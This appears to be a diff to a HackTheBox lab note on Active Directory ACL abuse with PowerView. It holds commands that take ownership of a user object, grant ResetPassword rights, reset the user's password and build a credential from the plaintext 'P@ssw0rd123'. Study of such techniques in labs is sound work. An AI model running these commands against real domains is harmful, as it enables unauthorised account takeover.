@@ -14,6 +14,7 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity Nico
 
 ## Reset Password
 - Prerequisite is to have PowerView loaded
+- Take ownership of user
 
 ```
 Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity Nico -Rights ResetPassword -Verbose
@@ -23,7 +24,6 @@ Set-DomainUserPassword Herman -AccountPassword $pass -Verbose
 
 ## Build New Credential
 ```
-$user = 'htb\herman'
 $pass = ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('HTB\Herman', $pass)
 ```
